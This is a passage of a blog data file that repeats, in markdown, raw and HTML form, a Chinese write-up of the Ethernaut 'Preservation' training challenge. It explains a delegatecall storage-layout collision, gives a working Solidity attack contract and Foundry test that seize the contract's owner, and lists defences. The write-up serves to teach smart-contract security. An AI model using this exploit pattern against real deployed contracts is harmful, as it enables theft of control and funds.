`owner`。为了能修改 `owner`（位于 slot 2），我们的攻击合约需要有与 `Preservation` 相似的存储布局，使得 `owner` 变量也位于 slot 2。\n3.  **第二次调用 `setFirstTime`**: 现在 `timeZone1Library` 已经指向我们的攻击合约。我们再次调用 `setFirstTime`，这次传入我们自己的地址（`player`）作为 `_timeStamp`。`delegatecall` 会执行我们攻击合约的 `setTime` 函数，该函数会将传入的 `_timeStamp` (我们的地址) 写入 `owner` 变量（slot 2），从而使我们成为 `owner`。\n\n## 💻 Foundry 实现\n\n### 攻击合约代码\n\n攻击合约的存储布局必须与 `Preservation` 兼容，至少在前三个槽位上是这样。它的 `setTime` 函数被设计用来修改 `owner`。\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n// 攻击合约\ncontract Attack {\n    // 保持与 Preservation 合约相同的存储布局\n    address public timeZone1Library;\n    address public timeZone2Library;\n    address public owner;\n\n    // 这个函数签名必须与库函数匹配\n    // 但实现是恶意的\n    function setTime(uint256 _newOwner) public {\n        // 当被 delegatecall 调用时，它会修改 Preservation 合约的 slot 2\n        owner = address(uint160(_newOwner));\n    }\n}\n```\n\n### Foundry 测试代码\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/16_Preservation.sol\";\n\n// 攻击合约定义 (同上)\ncontract Attack {\n    address public timeZone1Library;\n    address public timeZone2Library;\n    address public owner;\n    function setTime(uint256 _newOwner) public { owner = address(uint160(_newOwner)); }\n}\n\ncontract PreservationTest is Test {\n    Preservation instance;\n    Attack attackContract;\n    address player;\n\n    function setUp() public {\n        player = vm.addr(1);\n        \n        // 部署目标合约和攻击合约\n        LibraryContract lib = new LibraryContract();\n        instance = new Preservation(address(lib), address(lib));\n        attackContract = new Attack();\n    }\n\n    function testAttacker() public {\n        vm.startPrank(player, player);\n\n        // 步骤 1: 将 timeZone1Library (slot 0) 修改为攻击合约的地址\n        instance.setFirstTime(uint256(uint160(address(attackContract))));\n        \n        // 验证 timeZone1Library 是否已更改\n        assertEq(instance.timeZone1Library(), address(attackContract));\n\n        // 步骤 2: 再次调用 setFirstTime，这次会执行攻击合约的 setTime 函数\n        // 将 owner (slot 2) 修改为 player 的地址\n        instance.setFirstTime(uint256(uint160(player)));\n\n        // 验证 owner 是否已更改\n        assertEq(instance.owner(), player);\n\n        vm.stopPrank();\n    }\n}\n```\n\n### 关键攻击步骤\n\n1.  **部署攻击合约**: 创建一个具有恶意 `setTime` 函数和兼容存储布局的攻击合约。\n2.  **第一次 `setFirstTime` 调用**: 调用 `setFirstTime`，参数为攻击合约的地址。这会劫持 `timeZone1Library` 指针。\n3.  **第二次 `setFirstTime` 调用**: 再次调用 `setFirstTime`，参数为 `player` 的地址。这会执行攻击合约的代码，将 `player` 的地址写入 `Preservation` 合约的 `owner` 存储槽。\n\n## 🛡️ 防御措施\n\n1.  **使用 `library` 关键字**: Solidity 的 `library` 类型是专门为此类功能设计的。库是无状态的，并且不能被 `delegatecall` 直接调用来修改状态（除非使用了特定的技巧）。它们可以防止存储布局冲突。\n2.  **确保兼容的存储布局**: 如果你必须使用 `delegatecall` 到一个非库合约，请务必确保两个合约具有完全相同且兼容的存储布局。任何差异都可能导致严重的安全漏洞。\n3.  **不要将 `delegatecall` 暴露给用户输入**: 避免让用户控制 `delegatecall` 的目标地址或参数。`delegatecall` 应该只用于与受信任和经过验证的代码进行交互。\n4.  **使用 `call` 而不是 `delegatecall`**: 如果只是想调用另一个合约的函数，而不需要在当前合约的上下文中执行，请使用标准的 `call`。`call` 会在被调用合约自己的上下文中执行，不会影响调用者的存储。\n\n## 🔧 相关工具和技术\n\n-   **`delegatecall`**: EVM 中最强大的操作码之一，也是最危险的。它允许代码重用，但也带来了存储操纵的风险。\n-   **存储布局 (Storage Layout)**: 理解Solidity如何将变量存储在EVM的存储槽中是高级智能合约安全分析的基础。`forge inspect <Contract> storage-layout` 是一个非常有用的工具。\n-   **类型转换**: 将 `address` 转换为 `uint` 是本次攻击的关键。`uint256(uint160(address))` 是实现这一点的标准方法。\n\n## 🎯 总结\n\n**核心概念**:\n-   `delegatecall` 在调用者的上下文中执行代码，这意味着它可以修改调用者的存储。\n-   当调用者和被调用者的存储布局不匹配时，`delegatecall` 会导致意想不到的、灾难性的状态损坏。\n-   合约的存储槽是按顺序分配的，了解这个顺序是预测 `delegatecall` 影响的关键。\n\n**攻击向量**:\n-   利用 `delegatecall` 和不匹配的存储布局来覆盖合约的关键状态变量（如指针或所有者地址）。\n-   通过两步攻击，首先劫持代码执行流（通过覆盖库地址），然后执行恶意代码来获取权限。\n\n**防御策略**:\n-   严格限制 `delegatecall` 的使用。\n-   优先使用 `library` 关键字来创建无状态的辅助合约。\n-   确保 `delegatecall` 的目标合约具有兼容的存储布局。\n\n## 📚 参考资料\n\n-   [Solidity Docs: Delegatecall / Callcode and Libraries](https://docs.soliditylang.org/en/latest/contracts.html#delegatecall-callcode-and-libraries)\n-   [Consensys: Delegatecall Vulnerabilities](https://consensys.net/diligence/blog/2019/09/delegatecall-gotchas/)","source":"_posts/ethernaut-level-16-preservation.md","raw":"---\ntitle: 'Ethernaut Level 16: Preservation - Delegatecall与存储布局操纵'\ndate: 2025-01-25 16:25:00\nupdated: 2025-01-25 16:25:00\ncategories:\n  - Ethernaut 系列\n  - 进阶攻击篇 (11-20)\ntags:\n  - Ethernaut\n  - Foundry\n  - delegatecall\n  - Storage Layout\n  - 智能合约安全\n  - Solidity\nseries: Ethernaut Foundry Solutions\nexcerpt: \"深入剖析 `delegatecall` 的危险性以及存储布局不匹配如何导致致命漏洞。通过两次 `delegatecall` 调用，完全控制目标合约的 `owner`，掌握 Preservation 关卡的破解技巧。\"\n---\n\n# 🎯 Ethernaut Level 16: Preservation - Delegatecall与存储布局操纵\n\n> **关卡链接**: [Ethernaut Level 16 - Preservation](https://ethernaut.openzeppelin.com/level/16)  \n> **攻击类型**: `delegatecall` 存储布局操纵  \n> **难度**: ⭐⭐⭐⭐☆\n\n## 📋 挑战目标\n\n本关的目标是获取 `Preservation` 合约的所有权，即成为该合约的 `owner`。\n\n![Preservation Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel16.svg)\n\n## 🔍 漏洞分析\n\n`Preservation` 合约的 `owner` 是私有的，并且没有直接的函数来修改它。漏洞隐藏在使用 `delegatecall` 的 `setFirstTime` 和 `setSecondTime` 函数中。\n\n```solidity\ncontract Preservation {\n    address public timeZone1Library;\n    address public timeZone2Library;\n    address public owner;\n    uint storedTime;\n\n    // ... constructor ...\n\n    function setFirstTime(uint _timeStamp) public {\n        timeZone1Library.delegatecall(abi.encodePacked(bytes4(keccak256(\"setTime(uint256)\")), _timeStamp));\n    }\n\n    function setSecondTime(uint _timeStamp) public {\n        timeZone2Library.delegatecall(abi.encodePacked(bytes4(keccak256(\"setTime(uint256)\")), _timeStamp));\n    }\n}\n```\n\n`delegatecall` 是一个非常危险的操作码。它会在调用者合约的上下文中执行另一个合约的代码。这意味着，被调用合约（`library`）的代码可以修改调用者合约（`Preservation`）的存储。\n\n当 `setFirstTime` 通过 `delegatecall` 调用 `timeZone1Library` 的 `setTime` 函数时，`setTime` 函数修改的存储槽位是 `Preservation` 合约的槽位。\n\n让我们比较一下 `Preservation` 和 `LibraryContract` 的存储布局：\n\n| Slot | `Preservation` 合约 | `LibraryContract` 合约 |\n| :--- | :------------------ | :--------------------- |\n| 0    | `timeZone1Library`  | `storedTime`           |\n| 1    | `timeZone2Library`  | (未使用)               |\n| 2    | `owner`             | (未使用)               |\n| 3    | `storedTime`        | (未使用)               |\n\n当 `LibraryContract.setTime(uint)` 被 `delegatecall` 调用时，它以为自己在修改 `storedTime`（位于 slot 0）。但实际上，它修改的是 `Preservation` 合约的 slot 0，也就是 `timeZone1Library` 的地址！\n\n这就给了我们一个攻击路径：\n\n1.  **第一次调用 `setFirstTime`**: 我们传入一个精心构造的 `_timeStamp`，这个 `_timeStamp` 其实是我们的攻击合约的地址。这次调用会把 `Preservation` 合约的 `timeZone1Library` (slot 0) 修改为我们的攻击合约地址。\n2.  **创建攻击合约**: 我们的攻击合约需要有一个 `setTime(uint)` 函数。但是，这个函数的实现不是为了设置时间，而是为了修改 `owner`。为了能修改 `owner`（位于 slot 2），我们的攻击合约需要有与 `Preservation` 相似的存储布局，使得 `owner` 变量也位于 slot 2。\n3.  **第二次调用 `setFirstTime`**: 现在 `timeZone1Library` 已经指向我们的攻击合约。我们再次调用 `setFirstTime`，这次传入我们自己的地址（`player`）作为 `_timeStamp`。`delegatecall` 会执行我们攻击合约的 `setTime` 函数，该函数会将传入的 `_timeStamp` (我们的地址) 写入 `owner` 变量（slot 2），从而使我们成为 `owner`。\n\n## 💻 Foundry 实现\n\n### 攻击合约代码\n\n攻击合约的存储布局必须与 `Preservation` 兼容，至少在前三个槽位上是这样。它的 `setTime` 函数被设计用来修改 `owner`。\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n// 攻击合约\ncontract Attack {\n    // 保持与 Preservation 合约相同的存储布局\n    address public timeZone1Library;\n    address public timeZone2Library;\n    address public owner;\n\n    // 这个函数签名必须与库函数匹配\n    // 但实现是恶意的\n    function setTime(uint256 _newOwner) public {\n        // 当被 delegatecall 调用时，它会修改 Preservation 合约的 slot 2\n        owner = address(uint160(_newOwner));\n    }\n}\n```\n\n### Foundry 测试代码\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/16_Preservation.sol\";\n\n// 攻击合约定义 (同上)\ncontract Attack {\n    address public timeZone1Library;\n    address public timeZone2Library;\n    address public owner;\n    function setTime(uint256 _newOwner) public { owner = address(uint160(_newOwner)); }\n}\n\ncontract PreservationTest is Test {\n    Preservation instance;\n    Attack attackContract;\n    address player;\n\n    function setUp() public {\n        player = vm.addr(1);\n        \n        // 部署目标合约和攻击合约\n        LibraryContract lib = new LibraryContract();\n        instance = new Preservation(address(lib), address(lib));\n        attackContract = new Attack();\n    }\n\n    function testAttacker() public {\n        vm.startPrank(player, player);\n\n        // 步骤 1: 将 timeZone1Library (slot 0) 修改为攻击合约的地址\n        instance.setFirstTime(uint256(uint160(address(attackContract))));\n        \n        // 验证 timeZone1Library 是否已更改\n        assertEq(instance.timeZone1Library(), address(attackContract));\n\n        // 步骤 2: 再次调用 setFirstTime，这次会执行攻击合约的 setTime 函数\n        // 将 owner (slot 2) 修改为 player 的地址\n        instance.setFirstTime(uint256(uint160(player)));\n\n        // 验证 owner 是否已更改\n        assertEq(instance.owner(), player);\n\n        vm.stopPrank();\n    }\n}\n```\n\n### 关键攻击步骤\n\n1.  **部署攻击合约**: 创建一个具有恶意 `setTime` 函数和兼容存储布局的攻击合约。\n2.  **第一次 `setFirstTime` 调用**: 调用 `setFirstTime`，参数为攻击合约的地址。这会劫持 `timeZone1Library` 指针。\n3.  **第二次 `setFirstTime` 调用**: 再次调用 `setFirstTime`，参数为 `player` 的地址。这会执行攻击合约的代码，将 `player` 的地址写入 `Preservation` 合约的 `owner` 存储槽。\n\n## 🛡️ 防御措施\n\n1.  **使用 `library` 关键字**: Solidity 的 `library` 类型是专门为此类功能设计的。库是无状态的，并且不能被 `delegatecall` 直接调用来修改状态（除非使用了特定的技巧）。它们可以防止存储布局冲突。\n2.  **确保兼容的存储布局**: 如果你必须使用 `delegatecall` 到一个非库合约，请务必确保两个合约具有完全相同且兼容的存储布局。任何差异都可能导致严重的安全漏洞。\n3.  **不要将 `delegatecall` 暴露给用户输入**: 避免让用户控制 `delegatecall` 的目标地址或参数。`delegatecall` 应该只用于与受信任和经过验证的代码进行交互。\n4.  **使用 `call` 而不是 `delegatecall`**: 如果只是想调用另一个合约的函数，而不需要在当前合约的上下文中执行，请使用标准的 `call`。`call` 会在被调用合约自己的上下文中执行，不会影响调用者的存储。\n\n## 🔧 相关工具和技术\n\n-   **`delegatecall`**: EVM 中最强大的操作码之一，也是最危险的。它允许代码重用，但也带来了存储操纵的风险。\n-   **存储布局 (Storage Layout)**: 理解Solidity如何将变量存储在EVM的存储槽中是高级智能合约安全分析的基础。`forge inspect <Contract> storage-layout` 是一个非常有用的工具。\n-   **类型转换**: 将 `address` 转换为 `uint` 是本次攻击的关键。`uint256(uint160(address))` 是实现这一点的标准方法。\n\n## 🎯 总结\n\n**核心概念**:\n-   `delegatecall` 在调用者的上下文中执行代码，这意味着它可以修改调用者的存储。\n-   当调用者和被调用者的存储布局不匹配时，`delegatecall` 会导致意想不到的、灾难性的状态损坏。\n-   合约的存储槽是按顺序分配的，了解这个顺序是预测 `delegatecall` 影响的关键。\n\n**攻击向量**:\n-   利用 `delegatecall` 和不匹配的存储布局来覆盖合约的关键状态变量（如指针或所有者地址）。\n-   通过两步攻击，首先劫持代码执行流（通过覆盖库地址），然后执行恶意代码来获取权限。\n\n**防御策略**:\n-   严格限制 `delegatecall` 的使用。\n-   优先使用 `library` 关键字来创建无状态的辅助合约。\n-   确保 `delegatecall` 的目标合约具有兼容的存储布局。\n\n## 📚 参考资料\n\n-   [Solidity Docs: Delegatecall / Callcode and Libraries](https://docs.soliditylang.org/en/latest/contracts.html#delegatecall-callcode-and-libraries)\n-   [Consensys: Delegatecall Vulnerabilities](https://consensys.net/diligence/blog/2019/09/delegatecall-gotchas/)","slug":"ethernaut-level-16-preservation","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbpe0017bf5q1bn09pz7","content":"<h1 id=\"🎯-Ethernaut-Level-16-Preservation-Delegatecall与存储布局操纵\"><a href=\"#🎯-Ethernaut-Level-16-Preservation-Delegatecall与存储布局操纵\" class=\"headerlink\" title=\"🎯 Ethernaut Level 16: Preservation - Delegatecall与存储布局操纵\"></a>🎯 Ethernaut Level 16: Preservation - Delegatecall与存储布局操纵</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/16\">Ethernaut Level 16 - Preservation</a><br><strong>攻击类型</strong>: <code>delegatecall</code> 存储布局操纵<br><strong>难度</strong>: ⭐⭐⭐⭐☆</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>本关的目标是获取 <code>Preservation</code> 合约的所有权，即成为该合约的 <code>owner</code>。</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel16.svg\" alt=\"Preservation Requirements\"></p>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><p><code>Preservation</code> 合约的 <code>owner</code> 是私有的，并且没有直接的函数来修改它。漏洞隐藏在使用 <code>delegatecall</code> 的 <code>setFirstTime</code> 和 <code>setSecondTime</code> 函数中。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract Preservation &#123;</span><br><span class=\"line\">    address public timeZone1Library;</span><br><span class=\"line\">    address public timeZone2Library;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\">    uint storedTime;</span><br><span class=\"line\"></span><br><span class=\"line\">    // ... constructor ...</span><br><span class=\"line\"></span><br><span class=\"line\">    function setFirstTime(uint _timeStamp) public &#123;</span><br><span class=\"line\">        timeZone1Library.delegatecall(abi.encodePacked(bytes4(keccak256(&quot;setTime(uint256)&quot;)), _timeStamp));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setSecondTime(uint _timeStamp) public &#123;</span><br><span class=\"line\">        timeZone2Library.delegatecall(abi.encodePacked(bytes4(keccak256(&quot;setTime(uint256)&quot;)), _timeStamp));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>delegatecall</code> 是一个非常危险的操作码。它会在调用者合约的上下文中执行另一个合约的代码。这意味着，被调用合约（<code>library</code>）的代码可以修改调用者合约（<code>Preservation</code>）的存储。</p>\n<p>当 <code>setFirstTime</code> 通过 <code>delegatecall</code> 调用 <code>timeZone1Library</code> 的 <code>setTime</code> 函数时，<code>setTime</code> 函数修改的存储槽位是 <code>Preservation</code> 合约的槽位。</p>\n<p>让我们比较一下 <code>Preservation</code> 和 <code>LibraryContract</code> 的存储布局：</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">Slot</th>\n<th align=\"left\"><code>Preservation</code> 合约</th>\n<th align=\"left\"><code>LibraryContract</code> 合约</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">0</td>\n<td align=\"left\"><code>timeZone1Library</code></td>\n<td align=\"left\"><code>storedTime</code></td>\n</tr>\n<tr>\n<td align=\"left\">1</td>\n<td align=\"left\"><code>timeZone2Library</code></td>\n<td align=\"left\">(未使用)</td>\n</tr>\n<tr>\n<td align=\"left\">2</td>\n<td align=\"left\"><code>owner</code></td>\n<td align=\"left\">(未使用)</td>\n</tr>\n<tr>\n<td align=\"left\">3</td>\n<td align=\"left\"><code>storedTime</code></td>\n<td align=\"left\">(未使用)</td>\n</tr>\n</tbody></table>\n<p>当 <code>LibraryContract.setTime(uint)</code> 被 <code>delegatecall</code> 调用时，它以为自己在修改 <code>storedTime</code>（位于 slot 0）。但实际上，它修改的是 <code>Preservation</code> 合约的 slot 0，也就是 <code>timeZone1Library</code> 的地址！</p>\n<p>这就给了我们一个攻击路径：</p>\n<ol>\n<li><strong>第一次调用 <code>setFirstTime</code></strong>: 我们传入一个精心构造的 <code>_timeStamp</code>，这个 <code>_timeStamp</code> 其实是我们的攻击合约的地址。这次调用会把 <code>Preservation</code> 合约的 <code>timeZone1Library</code> (slot 0) 修改为我们的攻击合约地址。</li>\n<li><strong>创建攻击合约</strong>: 我们的攻击合约需要有一个 <code>setTime(uint)</code> 函数。但是，这个函数的实现不是为了设置时间，而是为了修改 <code>owner</code>。为了能修改 <code>owner</code>（位于 slot 2），我们的攻击合约需要有与 <code>Preservation</code> 相似的存储布局，使得 <code>owner</code> 变量也位于 slot 2。</li>\n<li><strong>第二次调用 <code>setFirstTime</code></strong>: 现在 <code>timeZone1Library</code> 已经指向我们的攻击合约。我们再次调用 <code>setFirstTime</code>，这次传入我们自己的地址（<code>player</code>）作为 <code>_timeStamp</code>。<code>delegatecall</code> 会执行我们攻击合约的 <code>setTime</code> 函数，该函数会将传入的 <code>_timeStamp</code> (我们的地址) 写入 <code>owner</code> 变量（slot 2），从而使我们成为 <code>owner</code>。</li>\n</ol>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击合约代码\"><a href=\"#攻击合约代码\" class=\"headerlink\" title=\"攻击合约代码\"></a>攻击合约代码</h3><p>攻击合约的存储布局必须与 <code>Preservation</code> 兼容，至少在前三个槽位上是这样。它的 <code>setTime</code> 函数被设计用来修改 <code>owner</code>。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">// 攻击合约</span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    // 保持与 Preservation 合约相同的存储布局</span><br><span class=\"line\">    address public timeZone1Library;</span><br><span class=\"line\">    address public timeZone2Library;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 这个函数签名必须与库函数匹配</span><br><span class=\"line\">    // 但实现是恶意的</span><br><span class=\"line\">    function setTime(uint256 _newOwner) public &#123;</span><br><span class=\"line\">        // 当被 delegatecall 调用时，它会修改 Preservation 合约的 slot 2</span><br><span class=\"line\">        owner = address(uint160(_newOwner));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Foundry-测试代码\"><a href=\"#Foundry-测试代码\" class=\"headerlink\" title=\"Foundry 测试代码\"></a>Foundry 测试代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/16_Preservation.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">// 攻击合约定义 (同上)</span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    address public timeZone1Library;</span><br><span class=\"line\">    address public timeZone2Library;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\">    function setTime(uint256 _newOwner) public &#123; owner = address(uint160(_newOwner)); &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract PreservationTest is Test &#123;</span><br><span class=\"line\">    Preservation instance;</span><br><span class=\"line\">    Attack attackContract;</span><br><span class=\"line\">    address player;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player = vm.addr(1);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 部署目标合约和攻击合约</span><br><span class=\"line\">        LibraryContract lib = new LibraryContract();</span><br><span class=\"line\">        instance = new Preservation(address(lib), address(lib));</span><br><span class=\"line\">        attackContract = new Attack();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testAttacker() public &#123;</span><br><span class=\"line\">        vm.startPrank(player, player);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 步骤 1: 将 timeZone1Library (slot 0) 修改为攻击合约的地址</span><br><span class=\"line\">        instance.setFirstTime(uint256(uint160(address(attackContract))));</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证 timeZone1Library 是否已更改</span><br><span class=\"line\">        assertEq(instance.timeZone1Library(), address(attackContract));</span><br><span class=\"line\"></span><br><span class=\"line\">        // 步骤 2: 再次调用 setFirstTime，这次会执行攻击合约的 setTime 函数</span><br><span class=\"line\">        // 将 owner (slot 2) 修改为 player 的地址</span><br><span class=\"line\">        instance.setFirstTime(uint256(uint160(player)));</span><br><span class=\"line\"></span><br><span class=\"line\">        // 验证 owner 是否已更改</span><br><span class=\"line\">        assertEq(instance.owner(), player);</span><br><span class=\"line\"></span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关键攻击步骤\"><a href=\"#关键攻击步骤\" class=\"headerlink\" title=\"关键攻击步骤\"></a>关键攻击步骤</h3><ol>\n<li><strong>部署攻击合约</strong>: 创建一个具有恶意 <code>setTime</code> 函数和兼容存储布局的攻击合约。</li>\n<li><strong>第一次 <code>setFirstTime</code> 调用</strong>: 调用 <code>setFirstTime</code>，参数为攻击合约的地址。这会劫持 <code>timeZone1Library</code> 指针。</li>\n<li><strong>第二次 <code>setFirstTime</code> 调用</strong>: 再次调用 <code>setFirstTime</code>，参数为 <code>player</code> 的地址。这会执行攻击合约的代码，将 <code>player</code> 的地址写入 <code>Preservation</code> 合约的 <code>owner</code> 存储槽。</li>\n</ol>\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><ol>\n<li><strong>使用 <code>library</code> 关键字</strong>: Solidity 的 <code>library</code> 类型是专门为此类功能设计的。库是无状态的，并且不能被 <code>delegatecall</code> 直接调用来修改状态（除非使用了特定的技巧）。它们可以防止存储布局冲突。</li>\n<li><strong>确保兼容的存储布局</strong>: 如果你必须使用 <code>delegatecall</code> 到一个非库合约，请务必确保两个合约具有完全相同且兼容的存储布局。任何差异都可能导致严重的安全漏洞。</li>\n<li><strong>不要将 <code>delegatecall</code> 暴露给用户输入</strong>: 避免让用户控制 <code>delegatecall</code> 的目标地址或参数。<code>delegatecall</code> 应该只用于与受信任和经过验证的代码进行交互。</li>\n<li><strong>使用 <code>call</code> 而不是 <code>delegatecall</code></strong>: 如果只是想调用另一个合约的函数，而不需要在当前合约的上下文中执行，请使用标准的 <code>call</code>。<code>call</code> 会在被调用合约自己的上下文中执行，不会影响调用者的存储。</li>\n</ol>\n<h2 id=\"🔧-相关工具和技术\"><a href=\"#🔧-相关工具和技术\" class=\"headerlink\" title=\"🔧 相关工具和技术\"></a>🔧 相关工具和技术</h2><ul>\n<li><strong><code>delegatecall</code></strong>: EVM 中最强大的操作码之一，也是最危险的。它允许代码重用，但也带来了存储操纵的风险。</li>\n<li><strong>存储布局 (Storage Layout)</strong>: 理解Solidity如何将变量存储在EVM的存储槽中是高级智能合约安全分析的基础。<code>forge inspect &lt;Contract&gt; storage-layout</code> 是一个非常有用的工具。</li>\n<li><strong>类型转换</strong>: 将 <code>address</code> 转换为 <code>uint</code> 是本次攻击的关键。<code>uint256(uint160(address))</code> 是实现这一点的标准方法。</li>\n</ul>\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>\n<ul>\n<li><code>delegatecall</code> 在调用者的上下文中执行代码，这意味着它可以修改调用者的存储。</li>\n<li>当调用者和被调用者的存储布局不匹配时，<code>delegatecall</code> 会导致意想不到的、灾难性的状态损坏。</li>\n<li>合约的存储槽是按顺序分配的，了解这个顺序是预测 <code>delegatecall</code> 影响的关键。</li>\n</ul>\n<p><strong>攻击向量</strong>:</p>\n<ul>\n<li>利用 <code>delegatecall</code> 和不匹配的存储布局来覆盖合约的关键状态变量（如指针或所有者地址）。</li>\n<li>通过两步攻击，首先劫持代码执行流（通过覆盖库地址），然后执行恶意代码来获取权限。</li>\n</ul>\n<p><strong>防御策略</strong>:</p>\n<ul>\n<li>严格限制 <code>delegatecall</code> 的使用。</li>\n<li>优先使用 <code>library</code> 关键字来创建无状态的辅助合约。</li>\n<li>确保 <code>delegatecall</code> 的目标合约具有兼容的存储布局。</li>\n</ul>\n<h2 id=\"📚-参考资料\"><a href=\"#📚-参考资料\" class=\"headerlink\" title=\"📚 参考资料\"></a>📚 参考资料</h2><ul>\n<li><a href=\"https://docs.soliditylang.org/en/latest/contracts.html#delegatecall-callcode-and-libraries\">Solidity Docs: Delegatecall &#x2F; Callcode and Libraries</a></li>\n<li><a href=\"https://consensys.net/diligence/blog/2019/09/delegatecall-gotchas/\">Consensys: Delegatecall Vulnerabilities</a></li>\n</ul>\n","more":"<h1 id=\"🎯-Ethernaut-Level-16-Preservation-Delegatecall与存储布局操纵\"><a href=\"#🎯-Ethernaut-Level-16-Preservation-Delegatecall与存储布局操纵\" class=\"headerlink\" title=\"🎯 Ethernaut Level 16: Preservation - Delegatecall与存储布局操纵\"></a>🎯 Ethernaut Level 16: Preservation - Delegatecall与存储布局操纵</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/16\">Ethernaut Level 16 - Preservation</a><br><strong>攻击类型</strong>: <code>delegatecall</code> 存储布局操纵<br><strong>难度</strong>: ⭐⭐⭐⭐☆</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 